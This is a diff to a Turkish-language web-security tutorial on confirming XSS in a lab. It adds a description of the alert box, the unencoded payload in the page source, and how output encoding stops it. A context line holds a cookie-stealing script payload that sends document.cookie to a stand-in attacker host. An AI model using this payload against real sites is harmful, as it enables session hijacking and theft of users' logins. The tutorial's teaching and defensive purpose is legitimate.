@@ -79,7 +79,11 @@ flowchart TD
 3. Alert çıkarsa reflected/stored XSS doğrulanmış olur.
 4. Gerçek etki kanıtı (lab'da): `<script>new Image().src='http://SALDIRGAN/c='+document.cookie</script>` — çerezin dışarı gittiğini kendi dinleyicinde gör.
 
-> 📸 EKRAN GÖRÜNTÜSÜ EKLENECEK: Bir yorum/arama alanına girilen payload'ın tetiklediği `alert` kutusu.
+**Ne gözlemlenir:** Payload'ı gönderdikten sonra sayfa yeniden yüklendiğinde tarayıcı `1` yazan bir JavaScript `alert` kutusu açar — yani girdiğin metin "veri" olarak gösterilmek yerine "kod" olarak çalıştırıldı. Sayfa kaynağına bakınca (`Ctrl+U`) payload'ın HTML'e ham (kodlanmamış) gömüldüğü görülür:
+```html
+<div class="arama-sonucu">Sonuç: <script>alert(1)</script></div>
+```
+Kodlama yapılmış olsaydı `&lt;script&gt;alert(1)&lt;/script&gt;` görünür ve **çalışmazdı** — çıktı kodlamanın (output encoding) savunmasının özü budur.
 
 > ⚠️ Sadece kendi lab'ında. `HttpOnly` çerezleri `document.cookie` ile okunamaz — bu yüzden aşağıdaki savunma kritiktir.
 
